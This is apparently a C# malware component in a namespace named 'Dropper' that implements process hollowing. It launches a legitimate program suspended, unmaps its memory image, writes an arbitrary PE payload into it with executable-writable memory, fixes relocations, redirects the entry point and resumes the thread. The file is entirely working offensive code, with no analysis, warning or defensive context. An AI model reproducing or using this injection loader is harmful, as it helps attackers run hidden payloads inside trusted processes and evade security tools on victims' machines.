﻿using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Dropper
{
    class Process
    {
        private const int IMAGE_DOS_SIGNATURE = 23117;
        private const int IMAGE_NT_SIGNATURE = 17744;
        private const int CREATE_SUSPENDED = 4;
        private const int EXIT_SUCCESS = 0;
        private const int STATUS_SUCCESS = 0;
        private const int CONTEXT_INTEGER = 2;
        private const int MEM_RESERVE = 8192;
        private const int MEM_COMMIT = 4096;
        private const int MEM_RELEASE = 32768;
        private const int PAGE_READWRITE = 4;
        private const int PAGE_EXECUTE_READWRITE = 64;
        private const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
        private const int INFINITE = -1;

        public static bool Hollow(byte[] bytecode, string file, string args = "")
        {
            bool success = false;
            IntPtr bytecodePtr = Marshal.UnsafeAddrOfPinnedArrayElement(bytecode, 0);
            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(bytecodePtr, typeof(IMAGE_DOS_HEADER));
            IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure((IntPtr)(bytecodePtr.ToInt64() + dosHeader.e_lfanew), typeof(IMAGE_NT_HEADERS64));
            if (!(dosHeader.e_magic != IMAGE_DOS_SIGNATURE || ntHeaders.Signature != IMAGE_NT_SIGNATURE))
            {
                PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
                STARTUPINFOA sInfo = new STARTUPINFOA();
                sInfo.cb = Marshal.SizeOf(sInfo);
                if (CreateProcessA(file, args, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, IntPtr.Zero, ref sInfo, ref pInfo))
                {
                    CONTEXT64 tContext = new CONTEXT64();
                    tContext.ContextFlags = CONTEXT_INTEGER;
                    if (GetThreadContext(pInfo.hThread, ref tContext))
                    {
                        long reg = tContext.Rdx + 16; int bytes = 0;
                        IntPtr addr = Marshal.AllocHGlobal(8);
                        if (ReadProcessMemory(pInfo.hProcess, (IntPtr)reg, addr, Marshal.SizeOf(addr), ref bytes))
                        {
                            addr = (IntPtr)Marshal.ReadInt64(addr);
                            if (NtUnmapViewOfSection(pInfo.hProcess, addr) == STATUS_SUCCESS)
                            {
                                addr = VirtualAllocEx(pInfo.hProcess, addr, ntHeaders.OptionalHeader.SizeOfImage, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
                                if (addr != IntPtr.Zero)
                                {
                                    long delta = addr.ToInt64() - ntHeaders.OptionalHeader.ImageBase; int old = 0;
                                    ntHeaders.OptionalHeader.ImageBase = addr.ToInt64();
                                    if (VirtualProtectEx(pInfo.hProcess, addr, ntHeaders.OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, ref old) && WriteProcessMemory(pInfo.hProcess, addr, bytecodePtr, ntHeaders.OptionalHeader.SizeOfHeaders, ref bytes))
                                    {
                                        bool error = false;
                                        IntPtr sectionPtr = (IntPtr)(bytecodePtr.ToInt64() + dosHeader.e_lfanew + Marshal.SizeOf(ntHeaders));
                                        IMAGE_SECTION_HEADER sectionHeader = new IMAGE_SECTION_HEADER();
                                        for (short i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
                                        {
                                            sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((IntPtr)(sectionPtr.ToInt64() + i * Marshal.SizeOf(sectionHeader)), typeof(IMAGE_SECTION_HEADER));
                                            if (sectionHeader.PointerToRawData != 0 && !WriteProcessMemory(pInfo.hProcess, (IntPtr)(addr.ToInt64() + sectionHeader.VirtualAddress), (IntPtr)(bytecodePtr.ToInt64() + sectionHeader.PointerToRawData), sectionHeader.SizeOfRawData, ref bytes))
                                            {
                                                error = true;
                                                break;
                                            }
                                        }
                                        if (!error)
                                        {
                                            if (delta != 0)
                                            {
                                                IMAGE_DATA_DIRECTORY relocationData = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
                                                for (short i = 0; i < ntHeaders.FileHeader.NumberOfSections && !error; i++)
                                                {
                                                    sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((IntPtr)(sectionPtr.ToInt64() + i * Marshal.SizeOf(sectionHeader)), typeof(IMAGE_SECTION_HEADER));
                                                    if (string.Compare(".reloc", Encoding.ASCII.GetString(sectionHeader.Name)) == 0)
                                                    {
                                                        int offset = 0;
                                                        while (offset < relocationData.Size && !error)
                                                        {
                                                            BASE_RELOCATION_BLOCK relocationBlock = (BASE_RELOCATION_BLOCK)Marshal.PtrToStructure((IntPtr)(bytecodePtr.ToInt64() + sectionHeader.PointerToRawData + offset), typeof(BASE_RELOCATION_BLOCK));
                                                            offset += Marshal.SizeOf(relocationBlock);
                                                            IntPtr relocationEntryPtr = (IntPtr)(bytecodePtr.ToInt64() + sectionHeader.PointerToRawData + offset);
                                                            BASE_RELOCATION_ENTRY relocationEntry = new BASE_RELOCATION_ENTRY();
                                                            int size = (relocationBlock.Size - Marshal.SizeOf(relocationBlock)) / Marshal.SizeOf(relocationEntry);
                                                            for (int j = 0; j < size && !error; j++)
                                                            {
                                                                relocationEntry = (BASE_RELOCATION_ENTRY)Marshal.PtrToStructure((IntPtr)(relocationEntryPtr.ToInt64() + j * Marshal.SizeOf(relocationEntry)), typeof(BASE_RELOCATION_ENTRY));
                                                                offset += Marshal.SizeOf(relocationEntry);
                                                                if (((relocationEntry.Type >> 12) & 0xFF) != 0)
                                                                {
                                                                    long patched = addr.ToInt64() + relocationBlock.Address + ((relocationEntry.Offset >> 4) & 0xFF);
                                                                    IntPtr bufferPtr = Marshal.AllocHGlobal(8);
                                                                    if (!ReadProcessMemory(pInfo.hProcess, (IntPtr)patched, bufferPtr, Marshal.SizeOf(bufferPtr), ref bytes))
                                                                    {
                                                                        error = true;
                                                                        break;
                                                                    }
                                                                    byte[] buffer = BitConverter.GetBytes(Marshal.ReadInt64(bufferPtr) + delta);
                                                                    bufferPtr = Marshal.UnsafeAddrOfPinnedArrayElement(buffer, 0);
                                                                    if (!WriteProcessMemory(pInfo.hProcess, (IntPtr)patched, bufferPtr, buffer.Length, ref bytes))
                                                                    {
                                                                        error = true;
                                                                        break;
                                                                    }
                                                                }
                                                            }
                                                        }
                                                        break;
                                                    }
                                                }
                                            }
                                            if (!error && WriteProcessMemory(pInfo.hProcess, (IntPtr)reg, Marshal.UnsafeAddrOfPinnedArrayElement(BitConverter.GetBytes(ntHeaders.OptionalHeader.ImageBase), 0), Marshal.SizeOf(ntHeaders.OptionalHeader.ImageBase), ref bytes))
                                            {
                                                tContext.Rcx = addr.ToInt64() + ntHeaders.OptionalHeader.AddressOfEntryPoint;
                                                if (SetThreadContext(pInfo.hThread, ref tContext) && ResumeThread(pInfo.hThread) != -1)
                                                {
                                                    success = true;
                                                    Console.WriteLine(string.Format("Welcome! | PID: {0} | TID: {1}", pInfo.dwProcessId, pInfo.dwThreadId));
                                                    WaitForSingleObject(pInfo.hThread, INFINITE);
                                                }
                                            }
                                        }
                                    }
                                    VirtualFreeEx(pInfo.hProcess, addr, 0, MEM_RELEASE);
                                }
                            }
                        }
                    }
                    if (!success)
                    {
                        TerminateProcess(pInfo.hProcess, EXIT_SUCCESS);
                    }
                    CloseHandle(pInfo.hThread); CloseHandle(pInfo.hProcess);
                }
            }
            return success;
        }

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CreateProcessA([MarshalAs(UnmanagedType.LPStr)] string lpApplicationName, [MarshalAs(UnmanagedType.LPStr)] string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFOA lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool TerminateProcess(IntPtr hProcess, int uExitCode);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int nSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

        [DllImport("ntdll.dll")]
        private static extern uint NtUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flNewProtect, ref int lpflOldProtect);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int dwFreeType);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        private static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern int WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public short e_magic;
            public short e_cblp;
            public short e_cp;
            public short e_crlc;
            public short e_cparhdr;
            public short e_minalloc;
            public short e_maxalloc;
            public short e_ss;
            public short e_sp;
            public short e_csum;
            public short e_ip;
            public short e_cs;
            public short e_lfarlc;
            public short e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4, ArraySubType = UnmanagedType.I2)]
            public short[] e_res;
            public short e_oemid;
            public short e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10, ArraySubType = UnmanagedType.I2)]
            public short[] e_res2;
            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_NT_HEADERS64
        {
            public int Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_FILE_HEADER
        {
            public short Machine;
            public short NumberOfSections;
            public int TimeDateStamp;
            public int PointerToSymbolTable;
            public int NumberOfSymbols;
            public short SizeOfOptionalHeader;
            public short Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER64
        {
            public short Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public int SizeOfCode;
            public int SizeOfInitializedData;
            public int SizeOfUninitializedData;
            public int AddressOfEntryPoint;
            public int BaseOfCode;
            public long ImageBase;
            public int SectionAlignment;
            public int FileAlignment;
            public short MajorOperatingSystemVersion;
            public short MinorOperatingSystemVersion;
            public short MajorImageVersion;
            public short MinorImageVersion;
            public short MajorSubsystemVersion;
            public short MinorSubsystemVersion;
            public int Win32VersionValue;
            public int SizeOfImage;
            public int SizeOfHeaders;
            public int CheckSum;
            public short Subsystem;
            public short DllCharacteristics;
            public long SizeOfStackReserve;
            public long SizeOfStackCommit;
            public long SizeOfHeapReserve;
            public long SizeOfHeapCommit;
            public int LoaderFlags;
            public int NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16, ArraySubType = UnmanagedType.Struct)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DATA_DIRECTORY
        {
            public int VirtualAddress;
            public int Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFOA
        {
            public int cb;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpReserved;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpDesktop;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT64
        {
            public long P1Home;
            public long P2Home;
            public long P3Home;
            public long P4Home;
            public long P5Home;
            public long P6Home;
            public int ContextFlags;
            public int MxCsr;
            public short SegCs;
            public short SegDs;
            public short SegEs;
            public short SegFs;
            public short SegGs;
            public short SegSs;
            public int EFlags;
            public long Dr0;
            public long Dr1;
            public long Dr2;
            public long Dr3;
            public long Dr6;
            public long Dr7;
            public long Rax;
            public long Rcx;
            public long Rdx;
            public long Rbx;
            public long Rsp;
            public long Rbp;
            public long Rsi;
            public long Rdi;
            public long R8;
            public long R9;
            public long R10;
            public long R11;
            public long R12;
            public long R13;
            public long R14;
            public long R15;
            public long Rip;
            // ...
            public long VectorControl;
            public long DebugControl;
            public long LastBranchToRip;
            public long LastBranchFromRip;
            public long LastExceptionToRip;
            public long LastExceptionFromRip;
        }

        private struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8, ArraySubType = UnmanagedType.I1)]
            public byte[] Name;
            public int VirtualSize;
            public int VirtualAddress;
            public int SizeOfRawData;
            public int PointerToRawData;
            public int PointerToRelocations;
            public int PointerToLinenumbers;
            public short NumberOfRelocations;
            public short NumberOfLinenumbers;
            public int Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct BASE_RELOCATION_BLOCK
        {
            [FieldOffset(0)]
            public int Address;
            [FieldOffset(4)]
            public int Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct BASE_RELOCATION_ENTRY
        {
            public ushort Offset;
            public ushort Type;
        }
    }
}
